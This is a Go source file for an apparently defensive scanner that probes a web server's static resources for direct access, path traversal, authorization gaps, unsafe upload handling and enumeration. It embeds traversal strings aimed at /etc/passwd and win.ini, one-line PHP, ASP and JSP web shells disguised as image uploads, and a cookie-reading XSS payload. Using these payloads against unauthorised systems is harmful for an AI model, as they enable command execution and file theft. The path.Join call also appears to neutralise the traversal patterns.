package static

import (
	"fmt"
	"net/http"
	"path"
	"strings"

	"github.com/sirupsen/logrus"
)

// Tester handles static resource security testing
type Tester struct {
	logger  *logrus.Logger
	client  *http.Client
	baseURL string
}

// New creates a new static resource tester instance
func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
	return &Tester{
		logger:  logger,
		client:  client,
		baseURL: baseURL,
	}
}

// RunTests performs static resource security tests
func (t *Tester) RunTests(paths []string) error {
	t.logger.Info("Starting static resource security tests")

	tests := []struct {
		name string
		fn   func([]string) error
	}{
		{"Direct Resource Access", t.testDirectAccess},
		{"Path Traversal", t.testPathTraversal},
		{"Resource Authorization", t.testResourceAuthorization},
		{"File Type Handling", t.testFileTypeHandling},
		{"Resource Enumeration", t.testResourceEnumeration},
	}

	for _, test := range tests {
		if err := test.fn(paths); err != nil {
			t.logger.Warnf("%s test failed: %v", test.name, err)
		}
	}

	return nil
}

// testDirectAccess tests direct access to static resources
func (t *Tester) testDirectAccess(paths []string) error {
	resourceTypes := []string{
		"jpg", "jpeg", "png", "gif", "pdf",
		"doc", "docx", "xls", "xlsx",
		"mp3", "mp4", "avi", "mov",
	}

	for _, p := range paths {
		for _, ext := range resourceTypes {
			testPath := fmt.Sprintf("%s/test.%s", p, ext)
			resp, err := t.makeRequest("GET", testPath, nil)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Direct access to %s files possible", ext)
			}
		}
	}

	return nil
}

// testPathTraversal tests for path traversal vulnerabilities
func (t *Tester) testPathTraversal(paths []string) error {
	traversalPatterns := []string{
		"../../../etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..\\..\\..\\windows\\win.ini",
	}

	for _, p := range paths {
		for _, pattern := range traversalPatterns {
			testPath := path.Join(p, pattern)
			resp, err := t.makeRequest("GET", testPath, nil)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Path traversal possible with pattern: %s", pattern)
			}
		}
	}

	return nil
}

// testResourceAuthorization tests authorization for static resources
func (t *Tester) testResourceAuthorization(paths []string) error {
	// Test accessing resources with different user contexts
	userContexts := []struct {
		userID string
		auth   string
	}{
		{"user1", "Bearer token1"},
		{"user2", "Bearer token2"},
		{"admin", "Bearer admin_token"},
	}

	for _, p := range paths {
		for _, ctx := range userContexts {
			headers := map[string]string{
				"Authorization": ctx.auth,
			}

			// Try to access another user's resource
			testPath := strings.Replace(p, ctx.userID, "other_user", 1)
			resp, err := t.makeRequest("GET", testPath, headers)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Cross-user static resource access possible: %s", testPath)
			}
		}
	}

	return nil
}

// testFileTypeHandling tests handling of different file types
func (t *Tester) testFileTypeHandling(paths []string) error {
	tests := []struct {
		filename string
		content  string
	}{
		{"test.php.jpg", "<?php system($_GET['cmd']); ?>"},
		{"test.asp.png", "<%eval request('cmd')%>"},
		{"test.jsp.gif", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"},
		{"test.html.pdf", "<script>alert(document.cookie)</script>"},
	}

	for _, p := range paths {
		for _, test := range tests {
			headers := map[string]string{
				"Content-Type": "image/jpeg", // Mismatched content type
			}

			testPath := path.Join(p, test.filename)
			resp, err := t.makeRequestWithBody("POST", testPath, headers, test.content)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Dangerous file type handling detected: %s", test.filename)
			}
		}
	}

	return nil
}

// testResourceEnumeration tests for resource enumeration vulnerabilities
func (t *Tester) testResourceEnumeration(paths []string) error {
	patterns := []string{
		"*", "%", "_",
		"index", "backup", "old",
		"temp", "upload", "files",
	}

	for _, p := range paths {
		for _, pattern := range patterns {
			testPath := fmt.Sprintf("%s/%s", p, pattern)
			resp, err := t.makeRequest("GET", testPath, nil)
			if err != nil {
				return err
			}
			resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.logger.Warnf("Resource enumeration possible with pattern: %s", pattern)
			}
		}
	}

	return nil
}

// makeRequest performs an HTTP request
func (t *Tester) makeRequest(method, path string, headers map[string]string) (*http.Response, error) {
	req, err := http.NewRequest(method, t.baseURL+path, nil)
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	return t.client.Do(req)
}

// makeRequestWithBody performs an HTTP request with a body
func (t *Tester) makeRequestWithBody(method, path string, headers map[string]string, body string) (*http.Response, error) {
	req, err := http.NewRequest(method, t.baseURL+path, strings.NewReader(body))
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	return t.client.Do(req)
}
